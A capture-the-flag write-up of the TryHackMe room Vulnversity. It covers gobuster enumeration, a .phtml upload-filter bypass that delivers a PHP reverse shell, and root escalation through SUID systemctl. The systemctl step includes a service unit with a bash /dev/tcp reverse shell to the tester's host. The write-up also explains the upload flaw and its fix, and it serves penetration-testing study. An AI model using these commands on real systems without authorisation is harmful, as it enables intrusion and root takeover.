---
title: THM — Vulnversity
type: lab-writeup
platform: THM
difficulty: foundational
os: Linux
status: Complete
date: 2026-03-27
tags:
  - foundational
  - lab
  - THM
  - linux
  - web
  - file-upload
  - bypass
  - suid
  - systemctl
  - gobuster
---

# THM — Vulnversity

## Lab Info

| Field | Value |
|---|---|
| Platform | TryHackMe |
| Room | Vulnversity |
| Difficulty | Easy |
| OS | Ubuntu 16.04 |
| IP | Machine IP (assigned at room launch) |
| Date | 2026-03-27 |

> **Summary:** Web application with a file upload form blocks `.php` but allows `.phtml` extension bypass. Reverse shell as www-data, then SUID `systemctl` abused to spawn a root shell via a custom service unit.

---

## Objectives

- [x] Recon: discover upload form via directory busting
- [x] Exploit: bypass file extension filter and upload PHP reverse shell
- [x] Escalate: abuse SUID on systemctl
- [x] Capture user and root flags

---

## Enumeration

### Port scan

```bash
nmap -sC -sV -oN nmap/vulnversity_initial <MACHINE_IP>
```

**Open ports:**

| Port | Service | Notes |
|---|---|---|
| 21/tcp | ftp | vsftpd 3.0.3 |
| 22/tcp | ssh | OpenSSH 7.2p2 |
| 139/tcp | netbios-ssn | Samba |
| 445/tcp | microsoft-ds | Samba |
| 3128/tcp | http-proxy | Squid proxy 3.5.12 |
| 3333/tcp | http | Apache httpd 2.4.18 (non-standard port) |

### Web enumeration

```bash
gobuster dir -u http://<IP>:3333 -w /usr/share/wordlists/dirb/common.txt
```

**Found:** `/internal/` — file upload form

### Extension fuzzing

Use Burp Intruder or a script to test which extensions are accepted:

```
.php    → blocked
.php3   → blocked
.php5   → blocked
.phtml  → ACCEPTED
.phps   → blocked
```

---

## Vulnerability Background

**Incomplete file extension blacklist** — The upload form blocks common PHP extensions but fails to filter `.phtml`, which Apache processes as PHP when `AddHandler` or `AddType` directives include it.

| Field | Detail |
|---|---|
| Weakness | CWE-434: Unrestricted Upload of File with Dangerous Type |
| Root cause | Blacklist approach instead of whitelist; missed `.phtml` extension |
| Fix | Whitelist allowed extensions; validate MIME type server-side; store uploads outside webroot |

---

## Foothold

### Upload reverse shell

1. Copy pentestmonkey PHP reverse shell → rename to `shell.phtml`
2. Edit `$ip` and `$port` in the file
3. Upload via `/internal/` form
4. Start listener: `nc -lvnp 4444`
5. Trigger: `http://<IP>:3333/internal/uploads/shell.phtml`

**Result:** Shell as `www-data`

### Shell upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Privilege Escalation

### SUID enumeration

```bash
find / -perm -u=s -type f 2>/dev/null
```

Unusual: `/bin/systemctl` has SUID bit set.

### Abuse systemctl SUID (GTFOBins)

Create a malicious service unit that spawns a reverse shell:

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/<YOUR_IP>/5555 0>&1"
[Install]
WantedBy=multi-user.target' > $TF

systemctl link $TF
systemctl enable --now $TF
```

```bash
# Second listener
nc -lvnp 5555
```

**Result:** Root shell.

---

## Flags

| Flag | Location |
|---|---|
| User | `/home/bill/user.txt` |
| Root | `/root/root.txt` |

> Flag values omitted — record yours privately.

---

## Key Takeaways

- Extension blacklists are inherently flawed — always prefer whitelists for upload validation
- `.phtml` is a frequently overlooked PHP-executable extension — always include in extension fuzzing lists
- `systemctl` with SUID is a powerful privesc vector — GTFOBins documents the technique
- Gobuster found the upload form on a non-standard port (3333) — never skip non-standard ports during web enum
- Burp Intruder or ffuf extension fuzzing is a standard technique for upload bypass testing

---

## Tools Used

- Nmap
- Gobuster
- Burp-Suite (Intruder for extension fuzzing)
- Netcat
- pentestmonkey PHP reverse shell

---

## References

- [TryHackMe — Vulnversity](https://tryhackme.com/room/vulnversity)
- [GTFOBins — systemctl](https://gtfobins.github.io/gtfobins/systemctl/)
- [OWASP File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

---
*Write-up completed: 2026-03-27*

## See Also

- Penetration-Testing-Methodology
- Web-Application-Testing
- Linux-Privilege-Escalation
- Gobuster
- Burp-Suite
- Reverse-Shell-Cheatsheet

---
<- [[Labs-MOC]]